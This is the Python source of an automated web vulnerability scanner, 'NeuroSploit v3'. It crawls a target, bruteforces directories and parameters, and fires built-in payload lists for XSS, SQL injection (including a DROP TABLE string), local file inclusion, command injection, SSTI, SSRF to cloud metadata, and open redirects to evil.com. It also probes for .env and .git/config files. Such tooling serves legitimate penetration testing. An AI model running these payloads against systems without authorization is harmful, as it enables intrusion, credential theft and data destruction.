"""
NeuroSploit v3 - Autonomous Scanner

This module performs autonomous endpoint discovery and vulnerability testing
when reconnaissance finds little or nothing. It actively:
1. Bruteforces directories using ffuf/gobuster/feroxbuster
2. Crawls the site aggressively
3. Tests common vulnerable endpoints
4. Generates test cases based on common patterns
5. Adapts based on what it discovers

GLOBAL AUTHORIZATION:
This tool is designed for authorized penetration testing only.
All tests are performed with explicit authorization from the target owner.
"""

import asyncio
import aiohttp
import subprocess
import json
import re
import os
from typing import Dict, List, Any, Optional, Callable
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from dataclasses import dataclass, field
from datetime import datetime


@dataclass
class DiscoveredEndpoint:
    """Represents a discovered endpoint"""
    url: str
    method: str = "GET"
    status_code: int = 0
    content_type: str = ""
    content_length: int = 0
    parameters: List[str] = field(default_factory=list)
    source: str = "discovery"  # How it was discovered
    interesting: bool = False  # Potentially vulnerable


@dataclass
class TestResult:
    """Result of a vulnerability test"""
    endpoint: str
    vuln_type: str
    payload: str
    is_vulnerable: bool
    confidence: float
    evidence: str
    request: Dict
    response: Dict


class AutonomousScanner:
    """
    Autonomous vulnerability scanner that actively discovers and tests endpoints.

    Works independently of reconnaissance - if recon fails, this scanner will:
    1. Crawl the target site
    2. Discover directories via bruteforce
    3. Find parameters and endpoints
    4. Test all discovered points for vulnerabilities
    """

    # Common vulnerable endpoints to always test
    COMMON_ENDPOINTS = [
        # Login/Auth
        "/login", "/signin", "/auth", "/admin", "/admin/login", "/wp-admin",
        "/user/login", "/account/login", "/administrator",
        # API endpoints
        "/api", "/api/v1", "/api/v2", "/api/users", "/api/user",
        "/api/login", "/api/auth", "/api/token", "/graphql",
        # File operations
        "/upload", "/download", "/file", "/files", "/documents",
        "/images", "/media", "/assets", "/static",
        # Common vulnerable paths
        "/search", "/query", "/find", "/lookup",
        "/include", "/page", "/view", "/show", "/display",
        "/read", "/load", "/fetch", "/get",
        # Debug/Dev
        "/debug", "/test", "/dev", "/staging",
        "/phpinfo.php", "/.env", "/.git/config",
        "/server-status", "/server-info",
        # CMS specific
        "/wp-content", "/wp-includes", "/xmlrpc.php",
        "/joomla", "/drupal", "/magento",
        # Config files
        "/config.php", "/configuration.php", "/settings.php",
        "/web.config", "/config.xml", "/config.json",
        # Backup files
        "/backup", "/backup.sql", "/dump.sql",
        "/db.sql", "/database.sql",
    ]

    # Common parameters to test
    COMMON_PARAMS = [
        "id", "page", "file", "path", "url", "redirect", "next",
        "query", "search", "q", "s", "keyword", "term",
        "user", "username", "name", "email", "login",
        "cat", "category", "item", "product", "article",
        "action", "cmd", "command", "exec", "run",
        "template", "tpl", "theme", "lang", "language",
        "sort", "order", "orderby", "filter",
        "callback", "jsonp", "format", "type",
        "debug", "test", "demo", "preview",
    ]

    # XSS test payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "'-alert('XSS')-'",
        "\"><img src=x onerror=alert('XSS')>",
    ]

    # SQLi test payloads
    SQLI_PAYLOADS = [
        "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
        "' OR 1=1--", "\" OR 1=1--", "1' AND '1'='1",
        "'; DROP TABLE users--", "1; SELECT * FROM users",
        "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
        "1' AND SLEEP(5)--", "1'; WAITFOR DELAY '0:0:5'--",
        "admin'--", "admin' #", "admin'/*",
    ]

    # LFI test payloads
    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "file:///etc/passwd",
        "/proc/self/environ",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "expect://id",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    ]

    # Command injection payloads
    CMDI_PAYLOADS = [
        "; id", "| id", "|| id", "&& id",
        "; whoami", "| whoami", "|| whoami",
        "`id`", "$(id)", "${id}",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "; ping -c 3 127.0.0.1", "| ping -c 3 127.0.0.1",
    ]

    # SSTI payloads
    SSTI_PAYLOADS = [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>",
        "{{config}}", "{{self}}", "{{request}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "@(1+2)", "#{7*7}",
    ]

    # SSRF payloads
    SSRF_PAYLOADS = [
        "http://localhost", "http://127.0.0.1",
        "http://[::1]", "http://0.0.0.0",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "file:///etc/passwd",
        "dict://localhost:11211/",
        "gopher://localhost:6379/_",
    ]

    def __init__(
        self,
        scan_id: str,
        log_callback: Optional[Callable] = None,
        timeout: int = 15,
        max_depth: int = 3
    ):
        self.scan_id = scan_id
        self.log_callback = log_callback or self._default_log
        self.timeout = timeout
        self.max_depth = max_depth
        self.discovered_endpoints: List[DiscoveredEndpoint] = []
        self.tested_urls: set = set()
        self.vulnerabilities: List[TestResult] = []
        self.session: Optional[aiohttp.ClientSession] = None
        self.wordlist_path = "/opt/wordlists/common.txt"

    async def _default_log(self, level: str, message: str):
        """Default logging"""
        print(f"[{level.upper()}] {message}")

    async def log(self, level: str, message: str):
        """Log a message"""
        if asyncio.iscoroutinefunction(self.log_callback):
            await self.log_callback(level, message)
        else:
            self.log_callback(level, message)

    async def __aenter__(self):
        connector = aiohttp.TCPConnector(ssl=False, limit=50)
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        return self

    async def __aexit__(self, *args):
        if self.session:
            await self.session.close()

    async def run_autonomous_scan(
        self,
        target_url: str,
        recon_data: Optional[Dict] = None
    ) -> Dict[str, Any]:
        """
        Run a fully autonomous scan on the target.

        This will:
        1. Spider/crawl the target
        2. Discover directories
        3. Find parameters
        4. Test all discovered endpoints

        Returns comprehensive results even if recon found nothing.
        """
        await self.log("info", f"Starting autonomous scan on: {target_url}")
        await self.log("info", "This is an authorized penetration test.")

        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        results = {
            "target": target_url,
            "started_at": datetime.utcnow().isoformat(),
            "endpoints": [],
            "vulnerabilities": [],
            "parameters_found": [],
            "directories_found": [],
            "technologies": []
        }

        # Phase 1: Initial probe
        await self.log("info", "Phase 1: Initial target probe...")
        initial_info = await self._probe_target(target_url)
        results["technologies"] = initial_info.get("technologies", [])
        await self.log("info", f"  Technologies detected: {', '.join(results['technologies']) or 'None'}")

        # Phase 2: Directory discovery
        await self.log("info", "Phase 2: Directory discovery...")
        directories = await self._discover_directories(base_url)
        results["directories_found"] = directories
        await self.log("info", f"  Found {len(directories)} directories")

        # Phase 3: Crawl the site
        await self.log("info", "Phase 3: Crawling site for links and forms...")
        crawled = await self._crawl_site(target_url)
        await self.log("info", f"  Crawled {len(crawled)} pages")

        # Phase 4: Discover parameters
        await self.log("info", "Phase 4: Parameter discovery...")
        parameters = await self._discover_parameters(target_url)
        results["parameters_found"] = parameters
        await self.log("info", f"  Found {len(parameters)} parameters")

        # Phase 5: Generate test endpoints
        await self.log("info", "Phase 5: Generating test endpoints...")
        test_endpoints = self._generate_test_endpoints(target_url, parameters, directories)
        await self.log("info", f"  Generated {len(test_endpoints)} test endpoints")

        # Merge with any recon data
        if recon_data:
            for url in recon_data.get("urls", []):
                self._add_endpoint(url, source="recon")
            for endpoint in recon_data.get("endpoints", []):
                if isinstance(endpoint, dict):
                    self._add_endpoint(endpoint.get("url", ""), source="recon")

        # Add test endpoints
        for ep in test_endpoints:
            self._add_endpoint(ep["url"], source=ep.get("source", "generated"))

        results["endpoints"] = [
            {
                "url": ep.url,
                "method": ep.method,
                "status": ep.status_code,
                "source": ep.source,
                "parameters": ep.parameters
            }
            for ep in self.discovered_endpoints
        ]

        # Phase 6: Vulnerability testing
        await self.log("info", f"Phase 6: Testing {len(self.discovered_endpoints)} endpoints for vulnerabilities...")

        for i, endpoint in enumerate(self.discovered_endpoints):
            if endpoint.url in self.tested_urls:
                continue
            self.tested_urls.add(endpoint.url)

            await self.log("debug", f"  [{i+1}/{len(self.discovered_endpoints)}] Testing: {endpoint.url[:80]}...")

            # Test each vulnerability type
            vulns = await self._test_endpoint_all_vulns(endpoint)
            self.vulnerabilities.extend(vulns)

            # Log findings immediately
            for vuln in vulns:
                await self.log("warning", f"  FOUND: {vuln.vuln_type} on {endpoint.url[:60]} (confidence: {vuln.confidence:.0%})")

        results["vulnerabilities"] = [
            {
                "type": v.vuln_type,
                "endpoint": v.endpoint,
                "payload": v.payload,
                "confidence": v.confidence,
                "evidence": v.evidence[:500]
            }
            for v in self.vulnerabilities
        ]

        results["completed_at"] = datetime.utcnow().isoformat()
        results["summary"] = {
            "endpoints_tested": len(self.tested_urls),
            "vulnerabilities_found": len(self.vulnerabilities),
            "critical": len([v for v in self.vulnerabilities if v.confidence >= 0.9]),
            "high": len([v for v in self.vulnerabilities if 0.7 <= v.confidence < 0.9]),
            "medium": len([v for v in self.vulnerabilities if 0.5 <= v.confidence < 0.7]),
        }

        await self.log("info", f"Autonomous scan complete. Found {len(self.vulnerabilities)} potential vulnerabilities.")

        return results

    def _add_endpoint(self, url: str, source: str = "discovery"):
        """Add an endpoint if not already discovered"""
        if not url:
            return
        for ep in self.discovered_endpoints:
            if ep.url == url:
                return
        self.discovered_endpoints.append(DiscoveredEndpoint(url=url, source=source))

    async def _probe_target(self, url: str) -> Dict:
        """Initial probe to gather info about the target"""
        info = {"technologies": [], "headers": {}, "server": ""}

        try:
            async with self.session.get(url, headers={"User-Agent": "NeuroSploit/3.0"}) as resp:
                info["headers"] = dict(resp.headers)
                info["status"] = resp.status
                body = await resp.text()

                # Detect technologies
                if "wp-content" in body or "WordPress" in body:
                    info["technologies"].append("WordPress")
                if "Joomla" in body:
                    info["technologies"].append("Joomla")
                if "Drupal" in body:
                    info["technologies"].append("Drupal")
                if "react" in body.lower() or "React" in body:
                    info["technologies"].append("React")
                if "angular" in body.lower():
                    info["technologies"].append("Angular")
                if "vue" in body.lower():
                    info["technologies"].append("Vue.js")
                if "php" in body.lower() or ".php" in body:
                    info["technologies"].append("PHP")
                if "asp.net" in body.lower() or "aspx" in body.lower():
                    info["technologies"].append("ASP.NET")
                if "java" in body.lower() or "jsp" in body.lower():
                    info["technologies"].append("Java")

                # Server header
                info["server"] = resp.headers.get("Server", "")
                if info["server"]:
                    info["technologies"].append(f"Server: {info['server']}")

                # X-Powered-By
                powered_by = resp.headers.get("X-Powered-By", "")
                if powered_by:
                    info["technologies"].append(f"Powered by: {powered_by}")

        except Exception as e:
            await self.log("debug", f"Probe error: {str(e)}")

        return info

    async def _discover_directories(self, base_url: str) -> List[str]:
        """Discover directories using built-in wordlist and common paths"""
        found_dirs = []

        # First try common endpoints
        await self.log("debug", "  Testing common endpoints...")

        tasks = []
        for endpoint in self.COMMON_ENDPOINTS:
            url = urljoin(base_url, endpoint)
            tasks.append(self._check_url_exists(url))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for endpoint, result in zip(self.COMMON_ENDPOINTS, results):
            if isinstance(result, dict) and result.get("exists"):
                found_dirs.append(endpoint)
                self._add_endpoint(urljoin(base_url, endpoint), source="directory_bruteforce")
                await self.log("debug", f"    Found: {endpoint} [{result.get('status')}]")

        # Try using ffuf if available
        if await self._tool_available("ffuf"):
            await self.log("debug", "  Running ffuf directory scan...")
            ffuf_results = await self._run_ffuf(base_url)
            for path in ffuf_results:
                if path not in found_dirs:
                    found_dirs.append(path)
                    self._add_endpoint(urljoin(base_url, path), source="ffuf")

        return found_dirs

    async def _check_url_exists(self, url: str) -> Dict:
        """Check if a URL exists (returns 2xx or 3xx)"""
        try:
            async with self.session.get(
                url,
                headers={"User-Agent": "NeuroSploit/3.0"},
                allow_redirects=False
            ) as resp:
                exists = resp.status < 400 and resp.status != 404
                return {"exists": exists, "status": resp.status}
        except:
            return {"exists": False, "status": 0}

    async def _tool_available(self, tool_name: str) -> bool:
        """Check if a tool is available"""
        try:
            result = subprocess.run(
                ["which", tool_name],
                capture_output=True,
                timeout=5
            )
            return result.returncode == 0
        except:
            return False

    async def _run_ffuf(self, base_url: str) -> List[str]:
        """Run ffuf for directory discovery"""
        found = []
        try:
            wordlist = self.wordlist_path if os.path.exists(self.wordlist_path) else None
            if not wordlist:
                return found

            cmd = [
                "ffuf",
                "-u", f"{base_url}/FUZZ",
                "-w", wordlist,
                "-mc", "200,201,301,302,307,401,403,500",
                "-t", "20",
                "-timeout", "10",
                "-o", "/tmp/ffuf_out.json",
                "-of", "json",
                "-s"  # Silent
            ]

            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            await asyncio.wait_for(process.wait(), timeout=120)

            if os.path.exists("/tmp/ffuf_out.json"):
                with open("/tmp/ffuf_out.json", "r") as f:
                    data = json.load(f)
                    for result in data.get("results", []):
                        path = "/" + result.get("input", {}).get("FUZZ", "")
                        if path and path != "/":
                            found.append(path)
                os.remove("/tmp/ffuf_out.json")

        except Exception as e:
            await self.log("debug", f"ffuf error: {str(e)}")

        return found

    async def _crawl_site(self, url: str) -> List[str]:
        """Crawl the site to find links, forms, and endpoints"""
        crawled = []
        to_crawl = [url]
        visited = set()
        depth = 0

        parsed_base = urlparse(url)
        base_domain = parsed_base.netloc

        while to_crawl and depth < self.max_depth:
            current_batch = to_crawl[:20]  # Crawl 20 at a time
            to_crawl = to_crawl[20:]

            tasks = []
            for page_url in current_batch:
                if page_url in visited:
                    continue
                visited.add(page_url)
                tasks.append(self._extract_links(page_url, base_domain))

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for result in results:
                if isinstance(result, list):
                    crawled.extend(result)
                    for link in result:
                        if link not in visited and link not in to_crawl:
                            to_crawl.append(link)

            depth += 1

        return list(set(crawled))

    async def _extract_links(self, url: str, base_domain: str) -> List[str]:
        """Extract links and forms from a page"""
        links = []

        try:
            async with self.session.get(
                url,
                headers={"User-Agent": "NeuroSploit/3.0"}
            ) as resp:
                body = await resp.text()

                # Extract href links
                href_pattern = r'href=["\']([^"\']+)["\']'
                for match in re.finditer(href_pattern, body, re.IGNORECASE):
                    link = match.group(1)
                    full_url = urljoin(url, link)
                    parsed = urlparse(full_url)

                    if parsed.netloc == base_domain:
                        links.append(full_url)
                        self._add_endpoint(full_url, source="crawler")

                # Extract src attributes
                src_pattern = r'src=["\']([^"\']+)["\']'
                for match in re.finditer(src_pattern, body, re.IGNORECASE):
                    link = match.group(1)
                    full_url = urljoin(url, link)
                    if ".js" in full_url or ".php" in full_url:
                        self._add_endpoint(full_url, source="crawler")

                # Extract form actions
                form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>'
                for match in re.finditer(form_pattern, body, re.IGNORECASE):
                    action = match.group(1) or url
                    full_url = urljoin(url, action)
                    self._add_endpoint(full_url, source="form")

                # Extract URLs from JavaScript
                js_url_pattern = r'["\']/(api|v1|v2|user|admin|login|auth)[^"\']*["\']'
                for match in re.finditer(js_url_pattern, body):
                    path = match.group(0).strip("\"'")
                    full_url = urljoin(url, path)
                    self._add_endpoint(full_url, source="javascript")

        except Exception as e:
            pass

        return links

    async def _discover_parameters(self, url: str) -> List[str]:
        """Discover parameters through various methods"""
        found_params = set()

        # Extract from URL
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            found_params.update(params.keys())

        # Try common parameters
        await self.log("debug", "  Testing common parameters...")

        base_url = url.split("?")[0]

        for param in self.COMMON_PARAMS[:20]:  # Test top 20
            test_url = f"{base_url}?{param}=test123"
            try:
                async with self.session.get(
                    test_url,
                    headers={"User-Agent": "NeuroSploit/3.0"}
                ) as resp:
                    body = await resp.text()
                    # Check if parameter is reflected or changes response
                    if "test123" in body or resp.status == 200:
                        found_params.add(param)

            except:
                pass

        # Try arjun if available
        if await self._tool_available("arjun"):
            await self.log("debug", "  Running arjun parameter discovery...")
            try:
                process = await asyncio.create_subprocess_exec(
                    "arjun", "-u", url, "-o", "/tmp/arjun_out.json", "-q",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                await asyncio.wait_for(process.wait(), timeout=60)

                if os.path.exists("/tmp/arjun_out.json"):
                    with open("/tmp/arjun_out.json", "r") as f:
                        data = json.load(f)
                        for url_data in data.values():
                            if isinstance(url_data, list):
                                found_params.update(url_data)
                    os.remove("/tmp/arjun_out.json")
            except:
                pass

        return list(found_params)

    def _generate_test_endpoints(
        self,
        target_url: str,
        parameters: List[str],
        directories: List[str]
    ) -> List[Dict]:
        """Generate test endpoints based on discovered information"""
        endpoints = []
        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # Generate endpoint + parameter combinations
        for directory in directories:
            full_url = urljoin(base_url, directory)
            endpoints.append({"url": full_url, "source": "directory"})

            # Add with common parameters
            for param in self.COMMON_PARAMS[:10]:
                test_url = f"{full_url}?{param}=FUZZ"
                endpoints.append({"url": test_url, "source": "param_injection"})

        # Target URL with discovered parameters
        for param in parameters:
            test_url = f"{target_url.split('?')[0]}?{param}=FUZZ"
            endpoints.append({"url": test_url, "source": "discovered_param"})

        # Multi-param combinations
        if len(parameters) >= 2:
            param_string = "&".join([f"{p}=FUZZ" for p in parameters[:5]])
            test_url = f"{target_url.split('?')[0]}?{param_string}"
            endpoints.append({"url": test_url, "source": "multi_param"})

        return endpoints

    async def _test_endpoint_all_vulns(self, endpoint: DiscoveredEndpoint) -> List[TestResult]:
        """Test an endpoint for all vulnerability types"""
        results = []

        url = endpoint.url

        # Test XSS
        xss_result = await self._test_xss(url)
        if xss_result:
            results.append(xss_result)

        # Test SQLi
        sqli_result = await self._test_sqli(url)
        if sqli_result:
            results.append(sqli_result)

        # Test LFI
        lfi_result = await self._test_lfi(url)
        if lfi_result:
            results.append(lfi_result)

        # Test Command Injection
        cmdi_result = await self._test_cmdi(url)
        if cmdi_result:
            results.append(cmdi_result)

        # Test SSTI
        ssti_result = await self._test_ssti(url)
        if ssti_result:
            results.append(ssti_result)

        # Test Open Redirect
        redirect_result = await self._test_open_redirect(url)
        if redirect_result:
            results.append(redirect_result)

        return results

    async def _inject_payload(self, url: str, payload: str) -> Optional[Dict]:
        """Inject a payload into URL parameters"""
        try:
            if "?" in url:
                base, query = url.split("?", 1)
                params = {}
                for p in query.split("&"):
                    if "=" in p:
                        k, v = p.split("=", 1)
                        params[k] = payload
                    else:
                        params[p] = payload
                test_url = base + "?" + urlencode(params)
            else:
                # Add payload as common parameter
                test_url = f"{url}?id={payload}&q={payload}"

            async with self.session.get(
                test_url,
                headers={"User-Agent": "NeuroSploit/3.0"},
                allow_redirects=False
            ) as resp:
                body = await resp.text()
                return {
                    "url": test_url,
                    "status": resp.status,
                    "headers": dict(resp.headers),
                    "body": body[:5000],
                    "payload": payload
                }
        except:
            return None

    async def _test_xss(self, url: str) -> Optional[TestResult]:
        """Test for XSS vulnerabilities"""
        for payload in self.XSS_PAYLOADS:
            result = await self._inject_payload(url, payload)
            if not result:
                continue

            # Check if payload is reflected
            if payload in result["body"]:
                return TestResult(
                    endpoint=url,
                    vuln_type="xss_reflected",
                    payload=payload,
                    is_vulnerable=True,
                    confidence=0.8,
                    evidence=f"Payload reflected in response: {payload}",
                    request={"url": result["url"], "method": "GET"},
                    response={"status": result["status"], "body_preview": result["body"][:500]}
                )

            # Check for unescaped reflection
            if payload.replace("<", "&lt;").replace(">", "&gt;") not in result["body"]:
                if any(tag in result["body"] for tag in ["<script", "<img", "<svg", "onerror", "onload"]):
                    return TestResult(
                        endpoint=url,
                        vuln_type="xss_reflected",
                        payload=payload,
                        is_vulnerable=True,
                        confidence=0.6,
                        evidence="HTML tags detected in response",
                        request={"url": result["url"], "method": "GET"},
                        response={"status": result["status"], "body_preview": result["body"][:500]}
                    )

        return None

    async def _test_sqli(self, url: str) -> Optional[TestResult]:
        """Test for SQL injection vulnerabilities"""
        error_patterns = [
            "sql syntax", "mysql", "sqlite", "postgresql", "oracle",
            "syntax error", "unclosed quotation", "unterminated string",
            "query failed", "database error", "odbc", "jdbc",
            "microsoft sql", "pg_query", "mysql_fetch", "ora-",
            "quoted string not properly terminated"
        ]

        for payload in self.SQLI_PAYLOADS:
            result = await self._inject_payload(url, payload)
            if not result:
                continue

            body_lower = result["body"].lower()

            # Check for SQL error messages
            for pattern in error_patterns:
                if pattern in body_lower:
                    return TestResult(
                        endpoint=url,
                        vuln_type="sqli_error",
                        payload=payload,
                        is_vulnerable=True,
                        confidence=0.9,
                        evidence=f"SQL error pattern found: {pattern}",
                        request={"url": result["url"], "method": "GET"},
                        response={"status": result["status"], "body_preview": result["body"][:500]}
                    )

        # Test for time-based blind SQLi
        time_payloads = ["1' AND SLEEP(5)--", "1'; WAITFOR DELAY '0:0:5'--"]
        for payload in time_payloads:
            import time
            start = time.time()
            result = await self._inject_payload(url, payload)
            elapsed = time.time() - start

            if elapsed >= 4.5:  # Account for network latency
                return TestResult(
                    endpoint=url,
                    vuln_type="sqli_blind_time",
                    payload=payload,
                    is_vulnerable=True,
                    confidence=0.7,
                    evidence=f"Response delayed by {elapsed:.1f}s (expected 5s)",
                    request={"url": url, "method": "GET"},
                    response={"status": 0, "body_preview": "TIMEOUT"}
                )

        return None

    async def _test_lfi(self, url: str) -> Optional[TestResult]:
        """Test for Local File Inclusion vulnerabilities"""
        lfi_indicators = [
            "root:x:", "root:*:", "[boot loader]", "[operating systems]",
            "bin/bash", "/bin/sh", "daemon:", "www-data:",
            "[extensions]", "[fonts]", "extension=",
        ]

        for payload in self.LFI_PAYLOADS:
            result = await self._inject_payload(url, payload)
            if not result:
                continue

            body_lower = result["body"].lower()

            for indicator in lfi_indicators:
                if indicator.lower() in body_lower:
                    return TestResult(
                        endpoint=url,
                        vuln_type="lfi",
                        payload=payload,
                        is_vulnerable=True,
                        confidence=0.95,
                        evidence=f"File content indicator found: {indicator}",
                        request={"url": result["url"], "method": "GET"},
                        response={"status": result["status"], "body_preview": result["body"][:500]}
                    )

        return None

    async def _test_cmdi(self, url: str) -> Optional[TestResult]:
        """Test for Command Injection vulnerabilities"""
        cmdi_indicators = [
            "uid=", "gid=", "groups=", "root:x:",
            "linux", "darwin", "bin/", "/usr/",
            "volume serial number", "directory of",
        ]

        for payload in self.CMDI_PAYLOADS:
            result = await self._inject_payload(url, payload)
            if not result:
                continue

            body_lower = result["body"].lower()

            for indicator in cmdi_indicators:
                if indicator.lower() in body_lower:
                    return TestResult(
                        endpoint=url,
                        vuln_type="command_injection",
                        payload=payload,
                        is_vulnerable=True,
                        confidence=0.9,
                        evidence=f"Command output indicator found: {indicator}",
                        request={"url": result["url"], "method": "GET"},
                        response={"status": result["status"], "body_preview": result["body"][:500]}
                    )

        return None

    async def _test_ssti(self, url: str) -> Optional[TestResult]:
        """Test for Server-Side Template Injection"""
        # Mathematical expressions that should evaluate
        math_payloads = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("<%= 7*7 %>", "49"),
            ("{{7*'7'}}", "7777777"),
            ("#{7*7}", "49"),
        ]

        for payload, expected in math_payloads:
            result = await self._inject_payload(url, payload)
            if not result:
                continue

            if expected in result["body"] and payload not in result["body"]:
                return TestResult(
                    endpoint=url,
                    vuln_type="ssti",
                    payload=payload,
                    is_vulnerable=True,
                    confidence=0.85,
                    evidence=f"Template expression evaluated: {payload} -> {expected}",
                    request={"url": result["url"], "method": "GET"},
                    response={"status": result["status"], "body_preview": result["body"][:500]}
                )

        return None

    async def _test_open_redirect(self, url: str) -> Optional[TestResult]:
        """Test for Open Redirect vulnerabilities"""
        redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "////evil.com",
            "https:evil.com",
            "/\\evil.com",
            "///evil.com/%2f..",
        ]

        redirect_params = ["url", "redirect", "next", "return", "goto", "dest", "rurl", "target"]

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for param in redirect_params:
            for payload in redirect_payloads:
                test_url = f"{base_url}?{param}={payload}"

                try:
                    async with self.session.get(
                        test_url,
                        headers={"User-Agent": "NeuroSploit/3.0"},
                        allow_redirects=False
                    ) as resp:
                        if resp.status in [301, 302, 303, 307, 308]:
                            location = resp.headers.get("Location", "")
                            if "evil.com" in location:
                                return TestResult(
                                    endpoint=url,
                                    vuln_type="open_redirect",
                                    payload=payload,
                                    is_vulnerable=True,
                                    confidence=0.85,
                                    evidence=f"Redirects to external domain: {location}",
                                    request={"url": test_url, "method": "GET"},
                                    response={"status": resp.status, "location": location}
                                )
                except:
                    pass

        return None
